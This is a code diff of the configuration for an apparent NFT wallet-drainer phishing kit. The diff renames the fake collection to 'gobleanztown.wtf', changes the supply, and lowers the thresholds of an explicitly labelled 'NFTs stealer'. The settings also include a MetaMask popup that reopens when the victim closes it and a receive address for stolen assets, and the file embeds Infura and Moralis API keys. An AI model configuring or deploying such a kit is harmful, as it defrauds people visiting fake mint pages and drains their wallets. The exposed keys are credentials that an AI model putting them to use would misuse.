@@ -4,8 +4,8 @@ const infuraId = "52cf9376ca0149889215a557c6ef7c53"     // Infuria Project ID | 
 const moralisApi = "UFZFSHwkweXCj3FHGZHXxFITwXNVYgMog2wk5kq60hpmR2HFUxKt8Rz1uZQmbkE2"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "apecitywtf",
-    title: "apecitywtf", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    name: "gobleanztown.wtf",
+    title: "gobleanztown.wtf", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "28.06.2022",
     socialMedia: {
         discord: "https://discord.gg/example",
@@ -24,7 +24,7 @@ const collectionInfo = {
 }
 const mintInfo = {
     price: 0,         // Price per NFT.
-    totalSupply: 10000,   // Total supply of NFTs.
+    totalSupply: 8888,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 6,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
@@ -32,8 +32,8 @@ const mintInfo = {
 
 const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
+    minValue: 0.03,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    checkMaxDay: 30, // Maximum number of days to check for the last transactions.
     receiveAddress: "" // leave empty if you want to use the same address 
 }
 
